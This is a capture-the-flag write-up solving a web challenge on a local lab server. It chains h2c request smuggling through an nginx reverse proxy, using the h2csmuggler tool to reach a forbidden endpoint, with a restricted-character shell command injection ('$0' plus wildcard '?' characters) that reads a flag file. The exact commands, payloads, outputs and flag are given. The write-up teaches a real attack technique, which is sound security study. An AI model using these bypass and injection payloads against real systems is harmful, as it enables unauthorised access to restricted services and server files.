## Plotwist

### Description

You stand on the edge of your final test. 
One choice, one letter, will determine your fate and you must prove yourself worthy of the path you take. 
No more gray, you must choose a side : Light or dark.

So time to ask jojo the question : which side of me are you? 

Choose carefully, for this moment will define who you truly are and remember, the hardest choices often lead to the greatest destiny. 

**Author : Sto**

### Solution

- With the dark side, we see that our output is rendered back in the server response. We think of SSTI, but it doesn't work. 
- With the light side, we receive a 403 code forbidden. and we learn that there's a nginx reverse proxy + using HTTP 1.1/

```
$curl --head http://localhost/api/noopsy

HTTP/1.1 403 Forbidden
Server: nginx/1.18.0
Content-Type: text/html
Content-Length: 153
Connection: keep-alive
```

So maybe we'd have to bypass this 403. 

We think about header smugggling as some misconfigured reverse proxy environments allow **HTTP/2 over cleartext (h2c)**.([Ref h2c Hacktricks](https://book.hacktricks.wiki/en/pentesting-web/h2c-smuggling.html)).
We will first send a request to the endpoint we can access `/api/lordhttp` with the UPGRADE header such as 
```
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```

This tells the proxy that you want to switch protocols on the current connection.

Then, we send the pending data immediately to perform a second request. The trick here is that if the proxy mishandles the upgrade and blindly forwards the second request without applying normal security checks, this request can target a restricted or internal endpoint that would normally be blocked (bypassing the original 403). 

Indeed, when upgrading a connection, the reverse proxy will often stop handling individual requests, assuming that once the connection has been established, its routing job is done. 


We can try directly use [h2csmuggler](https://github.com/YoursSto/h2csmuggler).
```
./h2csmuggler.py -x http://localhost:80/api/lordhttp http://localhost:80/api/noopsy
```

This gives us the following output : 
```
[INFO] h2c stream established successfully.
:status: 200
content-length: 46
content-type: application/json
date: Sun, 30 Mar 2025 02:14:57 GMT
server: hypercorn-h2

{"msg":"Hello from the other side, Lord HTTP"}



[INFO] Requesting - /api/noopsy
:status: 200
content-length: 100
content-type: application/json
date: Sun, 30 Mar 2025 02:14:57 GMT
server: hypercorn-h2

{"msg":"Got a secret, can you keep it? Well this one, I'll save it in the secret_flag.txt file ^.^"}
```
So we clearly bypassed the 403 code, and upgraded the connection to a http2 persistent one. Now let's find a way to obtain the secret that noopsy is hiding in `secret_flag.txt` file.


Let's try to send a letter to noopsy (maybe we have an ssti with him actually). 
```
./h2csmuggler.py -x http://localhost:80/api/lordhttp http://localhost:80/api/noopsy -X POST --data '{"letter": "{{7*7}}"}'   
[INFO] h2c stream established successfully.
:status: 200
content-length: 46
content-type: application/json
date: Sun, 30 Mar 2025 02:27:05 GMT
server: hypercorn-h2

{"msg":"Hello from the other side, Lord HTTP"}



[INFO] Requesting - /api/noopsy
:status: 200
content-length: 25
content-type: application/json
date: Sun, 30 Mar 2025 02:27:05 GMT
server: hypercorn-h2

{"error":"Money\n        It’s a crime 💸\n        Talk in dollars or digits, or don’t even try 💁‍♀️\n        Money\n        So they say 💰\n        Is the root of all evil today 😈\n        Got a question? I’ll answer you away 💬✨"}
```

With several tries and payloads we keep obtaining a the same response. 
So maybe there are some characters that are blocked. 
Let's focus on the error msg : it says "Talk in dollars or digits" and "Got a question? I'll answer you".
Let's try to send a dollar amount, "100$" for instance.

We obtain this like : 
```
Response for '0': [INFO] h2c stream established successfully.
:status: 200
content-length: 46
content-type: application/json
date: Sun, 30 Mar 2025 02:34:12 GMT
server: hypercorn-h2

{"msg":"Hello from the other side, Lord HTTP"}



[INFO] Requesting - /api/noopsy
:status: 200
content-length: 36
content-type: application/json
date: Sun, 30 Mar 2025 02:34:12 GMT
server: hypercorn-h2

{"msg":"/bin/sh: 1: 100$: not found\n"}
```

Therefore, basically we have the error msg that highlights the fact that there's a **command injection** as our payload is executed by `/bin/sh`. Moreover, the allowed characters are only : digits (0-9), spaces, question marks and dollar sign (we can discover this by trying or reading closely the error message ^^). 


We think about bash special parameters ([Ref bash manual](https://www.gnu.org/software/bash/manual/html_node/Special-Parameters.html))
So we can use **`$0`** to expand the content of a script ([shell expansion](https://www.gnu.org/software/bash/manual/html_node/Shell-Expansions.html)). 

As we know the file name (`secret_flag.txt`), we then set our final payload to :
```
./h2csmuggler.py -x http://localhost:80/api/lordhttp http://localhost:80/api/noopsy -X POST --data '{"letter": "$0 ???????????????"}'
```
Which outputs : 
```
[INFO] h2c stream established successfully.
:status: 200
content-length: 46
content-type: application/json
date: Thu, 27 Mar 2025 02:49:48 GMT
server: hypercorn-h2

{"msg":"Hello from the other side, Lord HTTP"}



[INFO] Requesting - /api/noopsy
:status: 200
content-length: 100
content-type: application/json
date: Thu, 27 Mar 2025 02:49:48 GMT
server: hypercorn-h2

{"msg":"secret_flag.txt: 1: N0PS{4nD_I_FE3l_50m37h1nG_5o_wR0nG_d01nG_7h3_r18h7_7h1nG}: not found\n"}
```

And flag : **`N0PS{4nD_I_FE3l_50m37h1nG_5o_wR0nG_d01nG_7h3_r18h7_7h1nG}`**